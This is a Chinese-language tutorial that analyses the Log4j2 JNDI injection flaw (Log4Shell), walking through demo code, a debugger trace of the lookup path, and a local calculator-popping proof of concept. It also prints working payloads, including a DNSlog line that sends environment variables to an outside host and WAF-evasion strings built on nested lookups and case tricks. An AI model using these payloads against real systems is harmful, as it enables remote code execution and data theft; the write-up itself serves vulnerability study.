## 0x01 Log4j2简介

log4j是Apache的一个开源项目，它一个用于记录日志信息的Java库，它提供了强大的日志记录功能，被广泛用于Java应用程序的日志管理。log4j2是log4j的升级版，旨在提供更强大、更灵活、更高效的日志记录功能。在java开发主流的框架中，比如springboot，大部分都是将log4j2作为日志管理工具。

### Log4j2的基本开发使用

不仅要知道log4j2是什么东西，也要知道它是怎么用的。

导入log4j2的相关依赖

    
    
    <dependency>  
    <groupId>org.apache.logging.log4j</groupId>  
    <artifactId>log4j-core</artifactId>  
    <version>2.14.1</version>  
    </dependency>  
    <dependency>  
    <groupId>org.apache.logging.log4j</groupId>  
    <artifactId>log4j-api</artifactId>  
    <version>2.14.1</version>  
    </dependency>  
  
---  
  
这里用的是2.14.2版本，也就是有漏洞的版本。log4j2 的一些实现方式，什么 xml，yaml，properties 等很多方式。

这里，我们简单用 xml 的方式来实现，文件如下

    
    
    <?xml version="1.0" encoding="UTF-8"?>    
      
    <configuration status="info">      
    <Properties>    
    <Property name="pattern1">[%-5p] %d %c - %m%n</Property>    
    <Property name="pattern2">    
    =========================================%n 日志级别：%p%n 日志时间：%d%n 所属类名：%c%n 所属线程：%t%n 日志信息：%m%n    
    </Property>    
    <Property name="filePath">logs/myLog.log</Property>    
    </Properties>    
    <appenders> <Console name="Console" target="SYSTEM_OUT">    
    <PatternLayout pattern="${pattern1}"/>    
    </Console> <RollingFile name="RollingFile" fileName="${filePath}"    
    filePattern="logs/$${date:yyyy-MM}/app-%d{MM-dd-yyyy}-%i.log.gz">    
    <PatternLayout pattern="${pattern2}"/>    
    <SizeBasedTriggeringPolicy size="5 MB"/>    
    </RollingFile>   
    </appenders>   
    <loggers>   
    <root level="info">    
    <appender-ref ref="Console"/>    
    <appender-ref ref="RollingFile"/>    
    </root>   
    </loggers>  
    </configuration>  
  
---  
  
定义日志打印的基本格式，然后写一个小demo测试一下

    
    
    package log4j2.test;  
      
    import org.apache.logging.log4j.LogManager;  
    import org.apache.logging.log4j.Logger;  
      
    public class Log4j2Test01 {  
    public static void main(String[] args){  
    Logger logger = LogManager.getLogger(Log4j2Test01.class);  
    logger.info("success!");  
    logger.error("error!");  
    logger.warn("warn!");//打印三条不同级别的消息  
    }  
    }  
  
---  
  
跑一下看看运行结果

![1.png](https://image.3001.net/images/20230802/1690978682_64ca497a71f8e8ab6520b.png!small)

成功打印出什么级别的日志，时间，消息等等。

### 实际应用场景

在实际业务中，有些日志是需要输出的，比如会输出到logs的日志文件中。

举个例子，前台用户登录是否成功的消息日志会被记录到我们的日志文件中，下面写个小代码模仿应用场景

    
    
    package log4j2.test;  
      
    import org.apache.logging.log4j.LogManager;  
    import org.apache.logging.log4j.Logger;  
      
    public class Log4j2Test02 {  
    public static void main(String[] args){  
    Logger logger = LogManager.getLogger(Log4j2Test02.class);  
    String username = "admin";  
    if (username == null){  
    logger.error("username不存在");  
    }  
    else {  
    logger.info("{} Login in!",username);  
    }  
    }  
    }  
  
---  
  
实际上代码肯定不是这样子，它会结合Mybatis查询数据库，将是否查询成功作为一个判断，再打印日志。我们只需要简单知道一下应用场景就行。

运行看看结果

![2.png](https://image.3001.net/images/20230802/1690978686_64ca497e4cdd63e144b9e.png!small)

## 0x02 Log4j2漏洞原理分析

### 1.影响版本

2.x <= log4j <= 2.15.0-rc1

### 2.漏洞原理

看这段代码

    
    
    logger.info("{} Login in!",username);  
  
---  
  
username用户可控，这本来就是不安全的，用户不信任的输入可能会导致一些安全问题，

让username=${java:os}，日志输出的就不是${java:os}

![3.png](https://image.3001.net/images/20230802/1690978689_64ca4981d72c83004a5ae.png!small)

而是操作系统的相关信息。查阅官方文档就可以知道这是log4j支持这样的一种功能

![4.png](https://image.3001.net/images/20230802/1690978692_64ca498495c7b20b87dc1.png!small)

像这样的还有这几个，其实这些并没有多么大的危害，最多也就泄露一些敏感信息。

其实继续查阅文档，还有JNDI的lookup这一栏

![5.png](https://image.3001.net/images/20230802/1690978695_64ca498749bf0efbf25aa.png!small)

看到这里大概也会猜到这里存在JNDI注入（官方文档链接：[https://logging.apache.org/log4j/2.x/manual/lookups.html#JavaLookup）](https://logging.apache.org/log4j/2.x/manual/lookups.html#JavaLookup%EF%BC%89)  

写个漏洞exp试试吧，这是JNDI的lookup，那么照葫芦画瓢，格式应该写成${jndi:exp}

    
    
    package log4j2.test;  
      
    import org.apache.logging.log4j.LogManager;  
    import org.apache.logging.log4j.Logger;  
      
    public class Log4j2EXP {  
    public static void main(String[] args){  
    Logger logger = LogManager.getLogger(Log4j2EXP.class);  
    String s = "${jndi:ldap://127.0.0.1:8085/zRFaCCEj}";  
    logger.info(s);  
    }  
    }  
  
---  
  
配置好反连

![6.png](https://image.3001.net/images/20230802/1690978700_64ca498c17078713ab413.png!small)

run一下看看

![7.png](https://image.3001.net/images/20230802/1690978703_64ca498f4e7501dac6432.png!small)

弹了两次计算器，其实这弹的两次计算器的触发流程都是一样的，分析一个就行。

### 3.调试与分析

调试有点难度，前面不太重要的信息太多，什么封装，函数调用啥的，所以别一开始就调试，设置到合适的断点

断点就下在PatternLayout类的toSerializable方法

![8.png](https://image.3001.net/images/20230802/1690978707_64ca49933a2b8f2a65f65.png!small)

这个event就是封装了日志消息的类，然后遍历日志信息，这个format方法可以看作处理字符串的方法，当i遍历到7的时候

![9.png](https://image.3001.net/images/20230802/1690978716_64ca499c8015a6fefc9ad.png!small)

buffer是缓冲区，把打印的日志放进去，刚好遍历到我们输入的恶意代码的地方，然后跟进format函数

![10.png](https://image.3001.net/images/20230802/1690978726_64ca49a64a83b7e87595e.png!small)

然后继续跟进这个方法

![11.png](https://image.3001.net/images/20230802/1690978729_64ca49a95881d7557a0f2.png!small)

开头这一部分用于处理日志事件的消息内容，并将其格式化输出到
StringBuilder对象中。它根据消息内容的类型来选择合适的格式化方法，并将格式化后的文本输出到 workingBuilder
对象中，以供后续处理和输出。

然后走到下面这个if语句里，判断是否是 Log4j2 的 lookups 功能，满足条件，继续往下走

![12.png](https://image.3001.net/images/20230802/1690978734_64ca49aeaca8b57056045.png!small)

workingBuilder里存储着日志信息，时间，级别，以及我们的payload等等

![13.png](https://image.3001.net/images/20230802/1690978741_64ca49b522ae0c5ff7910.png!small)

offset为56，从56位开始循环遍历，检查当前遍历的这两位是否是${，第56位workingBuilder对应的就是我们输入的payload的前两位，满足条件。从第三位开始截取日志消息，赋值给value，从图上可以看到，payload最后一个}还没有去掉。跟进到replace方法

![14.png](https://image.3001.net/images/20230802/1690978759_64ca49c798a27ec28354b.png!small)

然后调用substitute方法，跟进

![15.png](https://image.3001.net/images/20230802/1690978766_64ca49cee5438050614c4.png!small)

前面都是一些变量的初始化，没什么用。来到这个while循环，bufEnd是38，也就是payload的长度

prefixMatcher里有两个字符：$和{ 这行代码是在字符数组 chars中从指定位置 pos 开始，使用 prefixMatcher
对象进行前缀匹配。如果在指定的位置存在匹配的前缀，那么 startMatchLen 将记录匹配的长度，否则为 0。

startMatchLen长度不为0，它会走到

    
    
    if (pos > offset && chars[pos - 1] == escape)  
  
---  
  
这个if条件里，很明显不满足，因为pos是0

![16.png](https://image.3001.net/images/20230802/1690978770_64ca49d2104a9acfc802f.png!small)

进入到这个else，此时pos为2，再判断从2开始字符是不是${ 很明显不是

![17.png](https://image.3001.net/images/20230802/1690978774_64ca49d6cf27f9f6b36f1.png!small)

走到这里，又有一个匹配，匹配 } 匹配不到，pos+1开启下一轮循环，一直循环到最后一个字符，也就是 }

![18.png](https://image.3001.net/images/20230802/1690978779_64ca49dbbbe99d040da63.png!small)

匹配到了，endMatchLen不为空，它会去掉 ${}
占位符，留下真正的恶意代码，此时的bufname就是jndi:ldap://127.0.0.1:8085/zRFaCCEj
重新调用到substitute方法，跟进之后还是循环，只不过那些匹配都不成立了，好像substitute方法就是为了去掉 ${} 占位符的

继续往下走，又是循环，真的恶心，又是检测有没有 $，{，} 字符的，直接看最终结果

![19.png](https://image.3001.net/images/20230802/1690978785_64ca49e174d9c75c43c33.png!small)

遍历完后走到这里，跟进resolveVariable方法

![20.png](https://image.3001.net/images/20230802/1690978789_64ca49e5975c61ead5f39.png!small)

这里resolver有这么多类型，继续跟进到lookup方法

进入到了Interpolator类的lookup方法

![21.png](https://image.3001.net/images/20230802/1690978795_64ca49ebc88a303379b82.png!small)

通过分号将恶意代码分割成两部分，前一部分为jndi，通过strLookupMap查找对应类

可以看一下对应关系

![22.png](https://image.3001.net/images/20230802/1690978807_64ca49f79ba15a53cc6b1.png!small)

最后调用JndiLookup的lookup方法，跟进

![23.png](https://image.3001.net/images/20230802/1690978814_64ca49fec7f6be4063a55.png!small)

到此就结束了，继续跟进lookup方法就会走到JndiManager类的lookup方法，这是原生的JNDI注入的地方，已经不属于log4j2组件的范畴了。最后就是JNDI注入执行恶意命令，流程结束。

### 4.调试小结

当我们传入payload，首先判断输入的内容是否存在${}这些字符，然后截取占位符中的内容，也就是jndi:xxxx

然后用分号分割截取后的内容，分为jndi和xxxx(恶意代码)，jndi字符串用于在Map中查找自己对应的类，Map中支持的字符串有date, java,
marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j

选择出对应的解析器也就是JndiLookup调用lookup方法，实现JNDI注入

## 0x03 绕过技巧

看网上的资料，顺便提一下

推荐文章：<https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg>  

### 信息泄露

可以通过env或者sys利用DNSlog外带，得到目标系统的系统变量或者环境变量，或者主机的key，例如

    
    
    logger.info("${jndi:ldap://${env:USER}.dv3tdm.dnslog.cn}");  
  
---  
  
但是本地测试好像不行

### WAF绕过

可能最多的就是针对于jndi，ldap关键词的检测

#### 利用分隔符和多个`${}`绕过

官方文档写着，如果参数没有定义，那么 :- 后面的就是默认值

![24.png](https://image.3001.net/images/20230802/1690978819_64ca4a037938186fa332d.png!small)

payload如下

    
    
    logger.error("${${::-J}${what:-n}di:ldap://127.0.0.1:8085/zRFaCCEj}");  
  
---  
  
#### 大小写绕过（lower 和 upper）

也可以利用一些特殊字符

    
    
    ı => upper => i (Java 中测试可行)  
    ſ => upper => S (Java 中测试可行)  
    İ => upper => i (Java 中测试不可行)  
    K => upper => k (Java 中测试不可行)  
  
---  
  
payload如下

    
    
    logg.info("${${lower:J}ndi:ldap://127.0.0.1:8085/zRFaCCEj}");  
  
---  
  
## 0x04 小结

总结一句话就是，低版本的log4j2存在JNDI注入，可以任意代码执行。一行代码就可以获取服务器权限（滑稽）

在调试的时候还是比较头疼的，很多循环的代码很容易晕，所以在调这些繁琐难懂的java代码的时候，一定要静下心来，理解代码逻辑。

